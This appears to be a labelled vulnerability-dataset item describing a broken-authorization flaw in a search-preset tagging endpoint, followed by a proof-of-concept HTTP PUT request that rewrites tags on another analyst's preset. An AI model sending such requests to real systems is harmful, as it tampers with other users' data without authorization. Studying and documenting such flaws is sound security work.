diagnosis: The endpoint updates tagging metadata on saved search presets directly in Elasticsearch. It verifies authentication, but updates the document by presetId without checking that the document was created by or belongs to req.user.id. Any user can alter tags on other analysts' saved search presets.
exploit_request:
PUT /api/search/presets/preset_analyst_001/tags HTTP/1.1
Host: search.dataplatform.com
Authorization: Bearer <user_token>
Content-Type: application/json

{"tags": ["deprecated", "inaccurate"]}
